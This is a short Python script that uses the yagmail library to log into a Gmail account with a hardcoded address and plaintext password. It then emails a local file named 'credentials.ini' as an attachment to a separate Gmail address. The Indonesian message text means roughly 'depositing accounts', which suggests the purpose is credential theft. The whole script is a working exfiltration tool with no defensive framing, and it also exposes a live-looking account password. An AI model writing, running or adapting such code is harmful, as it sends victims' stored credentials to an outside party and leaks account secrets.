import yagmail
import os
import random
import sys
import time

receiver = "kakiadu99@gmail.com"

body = "setor akun nich"

filename = "credentials.ini"

yag = yagmail.SMTP("tutorial13456789@gmail.com","Kepolo99#")

yag.send(
	to=receiver,
	subject="wung apa tu man? wung puyuh",
	attachments=filename,
	contents=body,
)
